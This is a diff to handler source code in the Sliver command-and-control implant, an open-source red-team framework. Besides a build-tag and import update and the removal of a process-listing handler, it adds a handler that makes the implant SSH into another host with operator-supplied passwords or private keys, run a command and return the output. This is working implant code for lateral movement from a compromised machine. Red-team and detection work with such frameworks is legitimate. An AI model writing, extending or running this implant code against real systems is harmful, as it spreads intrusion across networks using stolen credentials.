@@ -1,4 +1,4 @@
-// +build windows linux darwin
+//go:build linux || darwin || windows
 
 package handlers
 
@@ -32,53 +32,17 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/ps"
 	"github.com/bishopfox/sliver/implant/sliver/screen"
+	"github.com/bishopfox/sliver/implant/sliver/shell/ssh"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	"github.com/golang/protobuf/proto"
+	"google.golang.org/protobuf/proto"
 )
 
 // ------------------------------------------------------------------------------------------
 // These are generic handlers (as in calling convention) that use platform specific code
 // ------------------------------------------------------------------------------------------
-
-func psHandler(data []byte, resp RPCResponse) {
-	psListReq := &sliverpb.PsReq{}
-	err := proto.Unmarshal(data, psListReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	procs, err := ps.Processes()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("failed to list procs %v", err)
-		// {{end}}
-	}
-
-	psList := &sliverpb.Ps{
-		Processes: []*commonpb.Process{},
-	}
-
-	for _, proc := range procs {
-		p := &commonpb.Process{
-			Pid:        int32(proc.Pid()),
-			Ppid:       int32(proc.PPid()),
-			Executable: proc.Executable(),
-			Owner:      proc.Owner(),
-		}
-		// {{if eq .Config.GOOS "windows"}}
-		p.SessionID = int32(proc.(*ps.WindowsProcess).SessionID())
-		// {{end}}
-		psList.Processes = append(psList.Processes, p)
-	}
-	data, err = proto.Marshal(psList)
-	resp(data, err)
-}
-
 func terminateHandler(data []byte, resp RPCResponse) {
 
 	terminateReq := &sliverpb.TerminateReq{}
@@ -335,4 +299,31 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEnt
 	}
 	return entries
 
+}
+
+func runSSHCommandHandler(data []byte, resp RPCResponse) {
+	commandReq := &sliverpb.SSHCommandReq{}
+	err := proto.Unmarshal(data, commandReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %s\n", err.Error())
+		// {{end}}
+		return
+	}
+	stdout, stderr, err := ssh.RunSSHCommand(commandReq.Hostname,
+		uint16(commandReq.Port),
+		commandReq.Username,
+		commandReq.Password,
+		commandReq.PrivKey,
+		commandReq.Command)
+	commandResp := &sliverpb.SSHCommand{
+		Response: &commonpb.Response{},
+		StdOut:   stdout,
+		StdErr:   stderr,
+	}
+	if err != nil {
+		commandResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(commandResp)
+	resp(data, err)
 }
